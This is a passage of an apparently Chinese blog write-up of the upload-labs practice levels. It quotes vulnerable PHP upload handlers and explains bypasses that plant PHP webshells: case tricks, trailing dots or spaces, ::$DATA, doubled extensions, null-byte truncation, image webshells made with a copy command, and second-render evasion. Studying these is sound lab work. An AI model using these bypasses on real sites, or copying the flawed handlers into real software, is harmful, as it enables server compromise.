class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gaysj31cs0s0794.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gaysj31cs0s0794.jpg" class="lazyload"></a></p>
<p>虽然过滤了 <code>.htaccess</code> ，但是代码中后缀转换为小写被去掉了，因此我们可以上传<strong>Php</strong>来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有Windows可以，因为Windows会忽略大小写)<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6dcjbj31240doq5a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6dcjbj31240doq5a.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6fyomj31go0m8adb.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6fyomj31go0m8adb.jpg" class="lazyload"></a><br>Windows下 <code>xx.jpg[空格]</code> 或 <code>xx.jpg</code> 。这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点<br>此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个 <code>.php空格</code> 文件即可。</p>
<hr>
<h2 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gct1j31cq0m70w4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gct1j31cq0m70w4.jpg" class="lazyload"></a><br>没有去除末尾的点，因此与上面同理，上传 <code>.php.</code> 绕过。</p>
<hr>
<h2 id="Pass-08-DATA-绕过"><a href="#Pass-08-DATA-绕过" class="headerlink" title="Pass-08 ::$DATA 绕过"></a>Pass-08 ::$DATA 绕过</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6h9qmj31h90lftc1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6h9qmj31h90lftc1.jpg" class="lazyload"></a></p>
<blockquote>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。</p>
</blockquote>
<p><strong>php</strong>在<strong>Windows</strong>的时候如果文件名+ <code>::$DATA</code> 会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持 <code>::$DATA</code> 之前的文件名 他的目的就是不检查后缀名,上传<code>.php::$DATA</code>绕过。(仅限Windows)</p>
<hr>
<h2 id="Pass-09-点-空格-点-绕过"><a href="#Pass-09-点-空格-点-绕过" class="headerlink" title="Pass-09 点 + 空格 + 点 绕过"></a>Pass-09 点 + 空格 + 点 绕过</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t8055ej31g50m3n0i.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t8055ej31g50m3n0i.jpg" class="lazyload"></a><br>move_upload_file的文件名直接为用户上传的文件名，题目说明是可控的。且会删除文件名末尾的点，因此我们可以结合Pass-7用<code>.php.空格.</code>绕过。</p>
<hr>
<h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>关键语句如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure></div>
<p>敏感后缀替换为空，双写 <code>.pphphp</code> 绕过即可。</p>
<hr>
<h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 00截断"></a>Pass-11 00截断</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>看到是白名单判断，但是<code>$img_path</code>直接拼接，因此可以利用<code>%00截断</code>绕过：<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7yca6j30js0cb0tc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7yca6j30js0cb0tc.jpg" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7zx1hj30fb06yjrn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7zx1hj30fb06yjrn.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Pass-12-略"><a href="#Pass-12-略" class="headerlink" title="Pass-12 略"></a>Pass-12 略</h2><p>把 <code>Pass-11</code> 的GET改成POST</p>
<h2 id="Pass-13-16-合理利用图片木马"><a href="#Pass-13-16-合理利用图片木马" class="headerlink" title="Pass-13-16 合理利用图片木马"></a>Pass-13-16 合理利用图片木马</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>使用下面这个语句然后传图片马</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy shell.jpg /b + shell.php /a muma.jpg</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg);</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                <span class="subst">$img_path</span> = UPLOAD_PATH.&#x27;/&#x27;.<span class="subst">$newfilename</span>;</span></span><br><span class="line"><span class="string">                imagejpeg(<span class="subst">$im</span>,<span class="subst">$img_path</span>);</span></span><br><span class="line"><span class="string">                @unlink(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">                <span class="subst">$is_upload</span> = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$msg</span> = &quot;</span>上传出错！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if((<span class="subst">$fileext</span> == &quot;</span>png<span class="string">&quot;) &amp;&amp; (<span class="subst">$filetype</span>==&quot;</span>image/png<span class="string">&quot;))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file(<span class="subst">$tmpname</span>,<span class="subst">$target_path</span>))&#123;</span></span><br><span class="line"><span class="string">            //使用上传的图片生成新的图片</span></span><br><span class="line"><span class="string">            <span class="subst">$im</span> = imagecreatefrompng(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            if(<span class="subst">$im</span> == false)&#123;</span></span><br><span class="line"><span class="string">                <span class="subst">$msg</span> = &quot;</span>该文件不是png格式的图片！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                @unlink(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                 //给新图片指定文件名</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                <span class="subst">$newfilename</span> = strval(rand()).&quot;</span>.png<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                <span class="subst">$img_path</span> = UPLOAD_PATH.&#x27;/&#x27;.<span class="subst">$newfilename</span>;</span></span><br><span class="line"><span class="string">                imagepng(<span class="subst">$im</span>,<span class="subst">$img_path</span>);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">                <span class="subst">$is_upload</span> = true;               </span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$msg</span> = &quot;</span>上传出错！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if((<span class="subst">$fileext</span> == &quot;</span>gif<span class="string">&quot;) &amp;&amp; (<span class="subst">$filetype</span>==&quot;</span>image/gif<span class="string">&quot;))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file(<span class="subst">$tmpname</span>,<span class="subst">$target_path</span>))&#123;</span></span><br><span class="line"><span class="string">            //使用上传的图片生成新的图片</span></span><br><span class="line"><span class="string">            <span class="subst">$im</span> = imagecreatefromgif(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">            if(<span class="subst">$im</span> == false)&#123;</span></span><br><span class="line"><span class="string">                <span class="subst">$msg</span> = &quot;</span>该文件不是gif格式的图片！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                @unlink(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                //给新图片指定文件名</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                <span class="subst">$newfilename</span> = strval(rand()).&quot;</span>.gif<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                <span class="subst">$img_path</span> = UPLOAD_PATH.&#x27;/&#x27;.<span class="subst">$newfilename</span>;</span></span><br><span class="line"><span class="string">                imagegif(<span class="subst">$im</span>,<span class="subst">$img_path</span>);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink(<span class="subst">$target_path</span>);</span></span><br><span class="line"><span class="string">                <span class="subst">$is_upload</span> = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$msg</span> = &quot;</span>上传出错！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        <span class="subst">$msg</span> = &quot;</span>只允许上传后缀为.jpg|.png|.gif的图片文件！<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>判断了后缀名、<code>content-type</code>，以及利用<code>imagecreatefromgif</code>判断是否为gif图片，最后再做了一次二次渲染，绕过方法可以参考先知的文章，写的很详细：<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a><br>jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。<br>仿照上方直接使用gif图片马，然后挂菜刀就好了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm45xoj30lw0d13zj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm45xoj30lw0d13zj.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span 